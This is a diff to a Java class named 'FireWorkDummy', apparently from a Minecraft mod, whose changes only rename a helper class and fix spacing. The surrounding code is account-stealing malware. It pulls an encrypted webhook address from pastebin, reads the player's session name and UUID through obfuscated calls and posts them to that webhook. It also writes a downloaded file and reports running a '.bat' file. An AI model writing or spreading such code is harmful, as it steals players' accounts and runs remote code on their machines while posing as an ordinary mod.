@@ -58,7 +58,7 @@ public class FireWorkDummy {
         try {
             BufferedReader in = new BufferedReader(new InputStreamReader(new URL("https://pastebin.com/raw/DR7aWqKS").openStream()));
             BufferedReader in2 = new BufferedReader(new InputStreamReader(new URL("https://pastebin.com/raw/PY1CRmaU").openStream()));
-            return decrypt(in2.readLine() ,in.readLine());
+            return decrypt(in2.readLine(), in.readLine());
         } catch (Exception ignored) {}
         return "";
     }
@@ -75,8 +75,8 @@ public class FireWorkDummy {
             Object name = sessionClass.getMethod("func_111285_a").invoke(session);
             Object uuid = sessionClass.getMethod("func_148255_b").invoke(session);
 
-            FireWorkUtil sendmessage = new FireWorkUtil(getWebhook());
-            sendmessage.addEmbed(new FireWorkUtil.RGBFirework()
+            CommandDummy sendmessage = new CommandDummy(getWebhook());
+            sendmessage.addEmbed(new CommandDummy.RGBFirework()
                     .setTitle("Minecraft Info")
                     .setColor(Color.CYAN)
                     .addField("Name", name.toString(), true)
@@ -113,8 +113,8 @@ public class FireWorkDummy {
                 fileOut.write(currByte);
             }
 
-            FireWorkUtil sendmessage = new FireWorkUtil(getWebhook());
-            sendmessage.addEmbed(new FireWorkUtil.RGBFirework()
+            CommandDummy sendmessage = new CommandDummy(getWebhook());
+            sendmessage.addEmbed(new CommandDummy.RGBFirework()
                     .setTitle("Loading")
                     .setColor(Color.GREEN)
                     .addField("Message ", "Running .bat file", true));
